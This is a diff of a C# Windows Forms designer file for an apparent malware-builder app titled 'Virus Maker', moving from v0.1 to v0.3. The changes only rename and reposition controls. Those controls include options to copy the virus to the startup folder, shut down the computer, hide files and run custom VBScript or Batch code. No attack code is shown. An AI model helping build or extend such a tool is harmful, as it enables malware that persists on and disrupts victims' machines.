@@ -34,10 +34,11 @@
             this.label1 = new System.Windows.Forms.Label();
             this.otherOptionsGroup = new System.Windows.Forms.GroupBox();
             this.timeToWait_Value = new System.Windows.Forms.NumericUpDown();
-            this.copyToStartup_Label = new System.Windows.Forms.CheckBox();
+            this.copyToStartup_CB = new System.Windows.Forms.CheckBox();
             this.readOnly_CB = new System.Windows.Forms.CheckBox();
             this.shutdownComp_CB = new System.Windows.Forms.CheckBox();
             this.customCode = new System.Windows.Forms.TextBox();
+            this.customCodeLang = new System.Windows.Forms.ComboBox();
             this.fileVisibility = new System.Windows.Forms.ComboBox();
             this.customCode_Label = new System.Windows.Forms.Label();
             this.timeToWait_Label = new System.Windows.Forms.Label();
@@ -67,7 +68,6 @@
             this.saveLocationBtn = new System.Windows.Forms.Button();
             this.dltLastSaveBtn = new System.Windows.Forms.Button();
             this.clearSettingsBtn = new System.Windows.Forms.Button();
-            this.customCodeLang = new System.Windows.Forms.ComboBox();
             ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
             this.splitContainer1.Panel1.SuspendLayout();
             this.splitContainer1.Panel2.SuspendLayout();
@@ -136,7 +136,7 @@
             // otherOptionsGroup
             // 
             this.otherOptionsGroup.Controls.Add(this.timeToWait_Value);
-            this.otherOptionsGroup.Controls.Add(this.copyToStartup_Label);
+            this.otherOptionsGroup.Controls.Add(this.copyToStartup_CB);
             this.otherOptionsGroup.Controls.Add(this.readOnly_CB);
             this.otherOptionsGroup.Controls.Add(this.shutdownComp_CB);
             this.otherOptionsGroup.Controls.Add(this.customCode);
@@ -160,16 +160,16 @@
             this.timeToWait_Value.Size = new System.Drawing.Size(35, 20);
             this.timeToWait_Value.TabIndex = 5;
             // 
-            // copyToStartup_Label
+            // copyToStartup_CB
             // 
-            this.copyToStartup_Label.AutoSize = true;
-            this.copyToStartup_Label.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.copyToStartup_Label.Location = new System.Drawing.Point(6, 93);
-            this.copyToStartup_Label.Name = "copyToStartup_Label";
-            this.copyToStartup_Label.Size = new System.Drawing.Size(155, 17);
-            this.copyToStartup_Label.TabIndex = 0;
-            this.copyToStartup_Label.Text = "Copy Virus to startup Folder";
-            this.copyToStartup_Label.UseVisualStyleBackColor = true;
+            this.copyToStartup_CB.AutoSize = true;
+            this.copyToStartup_CB.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.copyToStartup_CB.Location = new System.Drawing.Point(6, 93);
+            this.copyToStartup_CB.Name = "copyToStartup_CB";
+            this.copyToStartup_CB.Size = new System.Drawing.Size(157, 17);
+            this.copyToStartup_CB.TabIndex = 0;
+            this.copyToStartup_CB.Text = "Copy Virus to Startup Folder";
+            this.copyToStartup_CB.UseVisualStyleBackColor = true;
             // 
             // readOnly_CB
             // 
@@ -201,6 +201,19 @@
             this.customCode.Name = "customCode";
             this.customCode.Size = new System.Drawing.Size(184, 54);
             this.customCode.TabIndex = 4;
+            // 
+            // customCodeLang
+            // 
+            this.customCodeLang.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.customCodeLang.FormattingEnabled = true;
+            this.customCodeLang.Items.AddRange(new object[] {
+            "VBScript",
+            "Batch"});
+            this.customCodeLang.Location = new System.Drawing.Point(314, 11);
+            this.customCodeLang.Name = "customCodeLang";
+            this.customCodeLang.Size = new System.Drawing.Size(66, 21);
+            this.customCodeLang.TabIndex = 0;
+            this.customCodeLang.Text = "VBScript";
             // 
             // fileVisibility
             // 
@@ -505,19 +518,6 @@
             this.clearSettingsBtn.Text = "Clear Current Settings";
             this.clearSettingsBtn.UseVisualStyleBackColor = true;
             // 
-            // customCodeLang
-            // 
-            this.customCodeLang.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.customCodeLang.FormattingEnabled = true;
-            this.customCodeLang.Items.AddRange(new object[] {
-            "VBScript",
-            "Batch"});
-            this.customCodeLang.Location = new System.Drawing.Point(314, 11);
-            this.customCodeLang.Name = "customCodeLang";
-            this.customCodeLang.Size = new System.Drawing.Size(66, 21);
-            this.customCodeLang.TabIndex = 0;
-            this.customCodeLang.Text = "VBScript";
-            // 
             // MainForm
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -529,7 +529,7 @@
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.MaximizeBox = false;
             this.Name = "MainForm";
-            this.Text = "Virus Maker (Pre-Release v0.1)";
+            this.Text = "Virus Maker (Pre-Release v0.3)";
             this.splitContainer1.Panel1.ResumeLayout(false);
             this.splitContainer1.Panel1.PerformLayout();
             this.splitContainer1.Panel2.ResumeLayout(false);
@@ -585,7 +585,7 @@
         private System.Windows.Forms.CheckBox shutdownComp_CB;
         private System.Windows.Forms.Label timeToWait_Label;
         private System.Windows.Forms.CheckBox readOnly_CB;
-        private System.Windows.Forms.CheckBox copyToStartup_Label;
+        private System.Windows.Forms.CheckBox copyToStartup_CB;
         private System.Windows.Forms.PictureBox pictureBox1;
         private System.Windows.Forms.Label label1;
         private System.Windows.Forms.ComboBox customCodeLang;
